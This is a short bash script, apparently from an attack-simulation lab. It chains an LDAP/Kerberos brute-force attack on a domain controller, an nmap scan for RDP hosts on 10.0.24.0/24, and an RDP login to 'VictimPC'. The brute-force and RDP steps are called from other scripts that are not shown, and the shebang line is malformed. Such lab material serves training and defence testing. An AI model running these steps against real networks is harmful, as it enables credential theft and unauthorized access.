#bin/bash

#ANSI escape codes
#used to modify colors in printf statements
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'

printf "${YELLOW}[ ] Executing LDAP BruteForce attack against Domain Controller${NC}\n"
../0-LdapBf/execute-bf_ldap_kerberos_dc.sh
printf "\n${GREEN}[ ] Successfully executed LDAP BruteForce\n${NC} \n"

printf "\n${YELLOW}[ ] Press [Enter] to scan machines to find computer we can authenticate via nmap${NC}\n"
read -p ""
nmap -p 3389 10.0.24.0/24
printf "\n${GREEN}[ ] Discovered RDP Clients${NC}\n"

printf "\n${YELLOW}[ ] Press [Enter] to RDP to VictimPC${NC}\n"
read -p ""
../1-RdpVictimPcJeffL/RdpVictimpcJeffL.sh
